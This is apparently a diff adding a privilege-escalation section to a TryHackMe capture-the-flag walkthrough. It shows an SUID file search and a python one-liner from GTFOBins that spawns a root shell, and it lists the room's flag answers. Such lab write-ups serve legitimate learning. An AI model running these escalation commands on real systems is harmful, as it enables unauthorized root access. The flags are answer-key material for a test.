@@ -76,5 +76,30 @@ The results show the file path is `/var/www/user.txt` and the contents are displ
 #### Task 3.a: user.txt
 `Task 3.a Answer: THM{y0u_g0t_a_sh3ll}`
 
+## Task 4: Privilege Escalation
+"Now that we have a shell, let's escalate our privileges to root."
 
+Task 4.a directs us to search for "weird" files with SUID permissions so I'll start there
 
+`find / -perm -u=s -type f 2>/dev/null`
+
+Immediately among the results python stands out as having SUID permissions. Let's head over to GTFObins
+for a command to escalate to root
+
+We find running the following command with SUID permission gives root:
+`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+Using `find` again gives us the root flag location at /root/root.txt
+`find / -name root.txt 2>/dev/null`
+
+Displaying the contents of root.txt gives:
+`THM{pr1v1l3g3_3sc4l4t10n}`
+
+#### Task 4.a: Search for files with SUID permission. which file is weird?
+`Task 4.a Answer: /usr/bin/python`
+
+#### Task 4.b: Find a form to escalate your privileges.
+`Task 4.b Answer: No answer needed`
+
+#### Task 4.c: root.txt
+`Task 4.c Answer: THM{pr1v1l3g3_3sc4l4t10n}`
